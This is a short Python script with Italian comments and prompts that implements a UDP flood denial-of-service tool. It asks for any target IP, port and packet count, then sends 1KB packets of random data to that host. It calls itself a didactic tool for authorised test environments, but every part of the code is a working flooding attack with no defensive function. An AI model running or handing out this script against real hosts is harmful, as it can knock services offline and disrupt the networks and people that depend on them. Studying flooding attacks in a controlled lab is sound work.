import socket
import random
import time

# Funzione principale
def udp_flood():
    print("=== Simulazione UDP Flood (DoS) ===")
    print("ATTENZIONE: Questo è un tool didattico. Utilizzarlo solo su ambienti di test con autorizzazione!\n")
    
    # Input dall'utente
    target_ip = input("Inserisci l'IP target: ").strip()
    
    while True:
        try:
            target_port = int(input("Inserisci la porta UDP target (1-65535): "))
            if 1 <= target_port <= 65535:
                break
            else:
                print("La porta deve essere tra 1 e 65535.")
        except ValueError:
            print("Inserisci un numero valido per la porta.")
    
    while True:
        try:
            num_packets = int(input("Inserisci il numero di pacchetti da 1KB da inviare: "))
            if num_packets > 0:
                break
            else:
                print("Il numero deve essere maggiore di 0.")
        except ValueError:
            print("Inserisci un numero valido.")
    
    # Creazione del socket UDP
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except Exception as e:
        print(f"Errore nella creazione del socket: {e}")
        return
    
    # Pacchetto da 1KB (1024 byte) con dati casuali
    packet_size = 1024
    packet = random.randbytes(packet_size)  # Genera 1024 byte casuali
    
    print(f"\nAvvio dell'invio di {num_packets} pacchetti da 1KB verso {target_ip}:{target_port}")
    print("Premi Ctrl+C per interrompere manualmente.\n")
    
    sent = 0
    try:
        for i in range(num_packets):
            sock.sendto(packet, (target_ip, target_port))
            sent += 1
            
            # Stampa ogni 100 pacchetti per non sovraccaricare l'output
            if sent % 100 == 0 or sent == num_packets:
                print(f"Inviati {sent}/{num_packets} pacchetti...")
            
            # Piccolo delay opzionale per evitare di saturare troppo velocemente la rete locale
            # time.sleep(0.001)  # decommenta se necessario
    
    except KeyboardInterrupt:
        print("\n\nInterrotto dall'utente.")
    except Exception as e:
        print(f"\nErrore durante l'invio: {e}")
    finally:
        sock.close()
        print(f"\nSimulazione terminata. Pacchetti inviati: {sent}")

if __name__ == "__main__":
    udp_flood()